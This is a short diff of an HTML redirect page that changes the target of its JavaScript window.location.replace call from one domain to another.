@@ -9,7 +9,7 @@
 </head>
 <body>
 	<script>
-		window.location.replace('https://ecoequitybank.com');
+		window.location.replace('https://ukrgb.online');
 	</script>
 </body>
 </html>
